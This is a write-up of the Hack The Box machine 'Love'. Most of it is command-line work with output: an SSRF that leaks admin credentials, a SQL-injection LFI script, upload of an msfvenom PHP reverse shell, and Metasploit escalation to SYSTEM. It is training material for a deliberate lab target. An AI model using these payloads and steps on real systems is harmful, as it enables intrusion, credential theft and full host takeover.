# Target
| Category          | Details                                          |
|-------------------|--------------------------------------------------|
| 📝 **Name**       | [Love](https://app.hackthebox.com/machines/Love) |  
| 🏷 **Type**       | HTB Machine                                      |
| 🖥 **OS**         | Windows                                          |
| 🎯 **Difficulty** | Easy                                             |
| 📁 **Tags**       | SSRF, SQLi / LFI, Metasploit                     |

# Scan
```
80/tcp   open  http         Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: Voting System using PHP
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
443/tcp  open  ssl/http     Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
| tls-alpn: 
|_  http/1.1
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=staging.love.htb/organizationName=ValentineCorp/stateOrProvinceName=m/countryName=in
| Not valid before: 2021-01-18T14:00:16
|_Not valid after:  2022-01-18T14:00:16
|_http-title: 403 Forbidden
445/tcp  open  microsoft-ds Windows 10 Pro 19042 microsoft-ds (workgroup: WORKGROUP)
3306/tcp open  mysql        MariaDB 10.3.24 or later (unauthorized)
5000/tcp open  http         Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
|_http-title: 403 Forbidden
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
Service Info: Hosts: www.example.com, LOVE, www.love.htb; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-os-discovery: 
|   OS: Windows 10 Pro 19042 (Windows 10 Pro 6.3)
|   OS CPE: cpe:/o:microsoft:windows_10::-
|   Computer name: Love
|   NetBIOS computer name: LOVE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2025-08-20T10:33:03-07:00
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 2h41m34s, deviation: 4h02m30s, median: 21m33s
| smb2-time: 
|   date: 2025-08-20T17:33:04
|_  start_date: N/A
```

# Attack path
1. [Discover credentials to `love.htb` admin panel with SSRF vulnerability in `staging.love.htb`](#discover-credentials-to-lovehtb-admin-panel-with-ssrf-vulnerability-in-staginglovehtb)
2. [Discover arbitrary file upload vulnerability in `love.htb` admin panel](#discover-arbitrary-file-upload-vulnerability-in-lovehtb-admin-panel)
3. [Gain initial foothold wih `php/meterpreter/reverse_tcp` reverse shell uploaded using vulnerability in `candidates_add.php`](#gain-initial-foothold-wih-phpmeterpreterreverse_tcp-reverse-shell-uploaded-using-vulnerability-in-candidates_addphp)
4. [Upgrade `php/meterpreter/reverse_tcp` to `windows/x64/meterpreter/reverse_tcp`](#upgrade-phpmeterpreterreverse_tcp-to-windowsx64meterpreterreverse_tcp)
5. [Escalate to `Administartor` user using `exploit/windows/local/always_install_elevated`](#escalate-to-administartor-user-using-exploitwindowslocalalways_install_elevated)

### Discover credentials to `love.htb` admin panel with SSRF vulnerability in `staging.love.htb`

#### Add `love.htb` and `staging.love.htb` to `/etc/hosts`
```
┌──(magicrc㉿perun)-[~/attack/HTB Love]
└─$ echo "$TARGET love.htb staging.love.htb" | sudo tee -a /etc/hosts
10.129.222.158 love.htb staging.love.htb
```

#### Use SSRF vulnerability in `staging.love.htb` to access web application at port 5000 and discover admin credentials
```
┌──(magicrc㉿perun)-[~]
└─$ curl -s http://staging.love.htb/beta.php -d "file=http://localhost:5000&read=Scan+file" | grep "Vote Admin Creds"
<strong>Vote Admin Creds admin: @LoveIsInTheAir!!!!
```

### Discover arbitrary file upload vulnerability in `love.htb` admin panel

#### Prepare LFI exploit using SQLi in `UPDATE` query in `love.htb` admin panel
```
┌──(magicrc㉿perun)-[~/attack/HTB Love]
└─$ curl -s -c cookies.txt http://love.htb/admin/index.php -d 'username=admin&password=@LoveIsInTheAir!!!!&login=' -o /dev/null && \
curl -s -b cookies.txt http://love.htb/admin/positions_add.php -d 'description=Position&max_vote=1&add=' -o /dev/null && \
POSITION_ID=$(curl -s -b cookies.txt http://love.htb/admin/positions.php | grep -o "data-id='[0-9]\+'" | grep -o "[0-9]\+" | tail -1) && \
curl -s -b cookies.txt http://love.htb/admin/candidates_add.php -d "firstname=Firstname&lastname=Lastname&position=$POSITION_ID&platform=Platform&add=" -o /dev/null && \
{ cat <<'EOF'> lfi.sh
CANDIDATE_ID=$(curl -s -b cookies.txt http://love.htb/admin/candidates.php | grep -o "data-id='[0-9]\+'" | grep -o "[0-9]\+" | tail -1)
POSITION_ID=$(curl -s -b cookies.txt http://love.htb/admin/positions.php | grep -o "data-id='[0-9]\+'" | grep -o "[0-9]\+" | tail -1)
ENCODED_FILE=$(echo -n "$1" | jq -sRr @uri)
curl -s 'http://love.htb/admin/candidates_edit.php' -d "id=$CANDIDATE_ID&firstname=Firstname%27%2C+platform+%3D+LOAD_FILE%28%27$ENCODED_FILE%27%29+WHERE+id+%3D+%27$CANDIDATE_ID%27%3B+--+&lastname=Lastname&position=$POSITION&platform=platform&edit=" -o /dev/null && \
curl -s 'http://love.htb/admin/candidates_row.php' -d "id=$CANDIDATE_ID" | tail -n +3 | jq -r .platform
EOF
} && chmod +x ./lfi.sh
```

#### Discover local absolute directory path to `love.htb` admin panel application
`/admin/includes/` path has been discovered with `feroxbuster`.
```
┌──(magicrc㉿perun)-[~/attack/HTB Love]
└─$ curl -s http://love.htb/admin/includes/config_modal.php | grep "No such file"
<b>Warning</b>:  parse_ini_file(config.ini): failed to open stream: No such file or directory in <b>C:\xampp\htdocs\omrs\admin\includes\config_modal.php</b> on line <b>13</b><br />
```

#### Identify arbitrary file upload vulnerability in `candidates_add.php`
Vulnerability sits in line 11.
```
┌──(magicrc㉿perun)-[~/attack/HTB Love]
└─$ ./lfi.sh C:/xampp/htdocs/omrs/admin/candidates_add.php | cat -n 
<SNIP>
     9                  $filename = $_FILES['photo']['name'];
    10                  if(!empty($filename)){
    11                          move_uploaded_file($_FILES['photo']['tmp_name'], '../images/'.$filename);
    12                  }
<SNIP>
```

### Gain initial foothold wih `php/meterpreter/reverse_tcp` reverse shell uploaded using vulnerability in `candidates_add.php`

#### Generate `php/meterpreter/reverse_tcp` reverse shell
```
┌──(magicrc㉿perun)-[~/attack/HTB Love]
└─$ msfvenom -p php/meterpreter/reverse_tcp \
    LHOST=$(ip addr show tun0 | grep "inet " | awk '{print $2}' | cut -d'/' -f1) \
    LPORT=4444 \
    -f raw \
    -o shell.php
[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
[-] No arch selected, selecting arch: php from the payload
No encoder specified, outputting raw payload
Payload size: 1111 bytes
Saved as: shell.php
```

#### Start Metasploit with `php/meterpreter/reverse_tcp` handler and listen for reverse shell connection
```
┌──(magicrc㉿perun)-[~/attack/HTB Love]
└─$ msfconsole -q -x "use exploit/multi/handler;  set LHOST tun0; set LPORT 4444; set payload php/meterpreter/reverse_tcp; run"
[*] Starting persistent handler(s)...
[*] Using configured payload generic/shell_reverse_tcp
LHOST => tun0
LPORT => 4444
payload => php/meterpreter/reverse_tcp
[*] Started reverse TCP handler on 10.10.16.5:4444 
```

#### Upload and execute reverse shell using vulnerability discovered in `candidates_add.php`
```
┌──(magicrc㉿perun)-[~/attack/HTB Love]
└─$ POSITION_ID=$(curl -s -b cookies.txt http://love.htb/admin/positions.php | grep -o "data-id='[0-9]\+'" | grep -o "[0-9]\+" | tail -1) && \
curl -b cookies.txt http://love.htb/admin/candidates_add.php \
    -F photo=@shell.php \
    -F firstname=John \
    -F lastname=Doe \
    -F position=$POSITION_ID \
    -F platform=Platform \
    -F add= && \
curl http://love.htb/images/shell.php
```

#### Confirm foothold gained
```
[*] Sending stage (40004 bytes) to 10.129.222.158
[*] Meterpreter session 1 opened (10.10.16.5:4444 -> 10.129.222.158:65372) at 2025-08-25 17:51:51 +0200

meterpreter > getuid
Server username: Phoebe
```

### Upgrade `php/meterpreter/reverse_tcp` to `windows/x64/meterpreter/reverse_tcp`

#### Generate `windows/x64/meterpreter/reverse_tcp` reverse shell
```
┌──(magicrc㉿perun)-[~/attack/HTB Love]
└─$ msfvenom -p windows/x64/meterpreter/reverse_tcp \
    LHOST=$(ip addr show tun0 | grep "inet " | awk '{print $2}' | cut -d'/' -f1) \
    LPORT=5555 \
    -f exe \
    -o shell.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7168 bytes
Saved as: shell.exe
```

#### Upload `windows/x64/meterpreter/reverse_tcp` reverse shell
```
meterpreter > upload shell.exe
[*] Uploading  : /home/magicrc/attack/HTB Love/shell.exe -> shell.exe
[*] Uploaded -1.00 B of 7.00 KiB (-0.01%): /home/magicrc/attack/HTB Love/shell.exe -> shell.exe
[*] Completed  : /home/magicrc/attack/HTB Love/shell.exe -> shell.exe
```

#### Start Metasploit with `windows/x64/meterpreter/reverse_tcp` handler and listen for reverse shell connection 
```
┌──(magicrc㉿perun)-[~/attack/HTB Love]
└─$ msfconsole -q -x "use exploit/multi/handler; set LHOST tun0; set LPORT 5555; set payload windows/x64/meterpreter/reverse_tcp; run"
[*] Starting persistent handler(s)...
[*] Using configured payload generic/shell_reverse_tcp
LHOST => tun0
LPORT => 5555
payload => windows/x64/meterpreter/reverse_tcp
[*] Started reverse TCP handler on 10.10.16.5:5555 
```

#### Execute the uploaded binary from the PHP Meterpreter shell
```
meterpreter > execute -f shell.exe
Process 5856 created.
```

#### Confirm reverse shell connection upgraded to `windows/x64/meterpreter/reverse_tcp`
```
[*] Sending stage (203846 bytes) to 10.129.222.158
[*] Meterpreter session 1 opened (10.10.16.5:5555 -> 10.129.222.158:65373) at 2025-08-25 18:07:24 +0200

meterpreter > getuid
Server username: LOVE\Phoebe
```

### Escalate to `Administartor` user using `exploit/windows/local/always_install_elevated`

#### Run exploit suggester to discover that target is vulnerable to `exploit/windows/local/always_install_elevated`
```
msf6 > use post/multi/recon/local_exploit_suggester
msf6 post(multi/recon/local_exploit_suggester) > setg session 1
session => 1
msf6 post(multi/recon/local_exploit_suggester) > run

[*] 10.129.222.158 - Collecting local exploits for x64/windows...
[*] 10.129.222.158 - 198 exploit checks are being tried...
[+] 10.129.222.158 - exploit/windows/local/always_install_elevated: The target is vulnerable.
[+] 10.129.222.158 - exploit/windows/local/bypassuac_dotnet_profiler: The target appears to be vulnerable.
[+] 10.129.222.158 - exploit/windows/local/bypassuac_fodhelper: The target appears to be vulnerable.
[+] 10.129.222.158 - exploit/windows/local/bypassuac_sdclt: The target appears to be vulnerable.
[+] 10.129.222.158 - exploit/windows/local/cve_2021_40449: The target appears to be vulnerable. Vulnerable Windows 10 20H2 build detected!
[+] 10.129.222.158 - exploit/windows/local/cve_2022_21882_win32k: The target appears to be vulnerable.
[+] 10.129.222.158 - exploit/windows/local/cve_2022_21999_spoolfool_privesc: The target appears to be vulnerable.
[+] 10.129.222.158 - exploit/windows/local/cve_2023_28252_clfs_driver: The target appears to be vulnerable. The target is running windows version: 10.0.19042.0 which has a vulnerable version of clfs.sys installed by default
[+] 10.129.222.158 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated.
[*] Running check method for exploit 47 / 47
[*] 10.129.222.158 - Valid modules for session 1:
============================

 #   Name                                                           Potentially Vulnerable?  Check Result
 -   ----                                                           -----------------------  ------------
 1   exploit/windows/local/always_install_elevated                  Yes                      The target is vulnerable.
 2   exploit/windows/local/bypassuac_dotnet_profiler                Yes                      The target appears to be vulnerable.
 3   exploit/windows/local/bypassuac_fodhelper                      Yes                      The target appears to be vulnerable.
 4   exploit/windows/local/bypassuac_sdclt                          Yes                      The target appears to be vulnerable.
 5   exploit/windows/local/cve_2021_40449                           Yes                      The target appears to be vulnerable. Vulnerable Windows 10 20H2 build detected!
 6   exploit/windows/local/cve_2022_21882_win32k                    Yes                      The target appears to be vulnerable.
 7   exploit/windows/local/cve_2022_21999_spoolfool_privesc         Yes                      The target appears to be vulnerable.
 8   exploit/windows/local/cve_2023_28252_clfs_driver               Yes                      The target appears to be vulnerable. The target is running windows version: 10.0.19042.0 which has a vulnerable version of clfs.sys installed by default                                                                                                                                                   
 9   exploit/windows/local/ms16_032_secondary_logon_handle_privesc  Yes                      The service is running, but could not be validated.
```

#### Run `exploit/windows/local/always_install_elevated`
```
msf6 exploit(windows/local/always_install_elevated) > use exploit/windows/local/always_install_elevated
[*] Using configured payload windows/meterpreter/reverse_tcp
msf6 exploit(windows/local/always_install_elevated) > set LHOST tun0
LHOST => 10.10.16.5
msf6 exploit(windows/local/always_install_elevated) > set LPORT 6666
LPORT => 6666
msf6 exploit(windows/local/always_install_elevated) > run

[*] Started reverse TCP handler on 10.10.16.5:6666 
[*] Uploading the MSI to C:\Users\Phoebe\AppData\Local\Temp\kiHkyMlzvcD.msi ...
[*] Executing MSI...
[*] Sending stage (177734 bytes) to 10.129.222.158
[+] Deleted C:\Users\Phoebe\AppData\Local\Temp\kiHkyMlzvcD.msi
[*] Meterpreter session 2 opened (10.10.16.5:6666 -> 10.129.222.158:65374) at 2025-08-25 18:18:36 +0200

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```
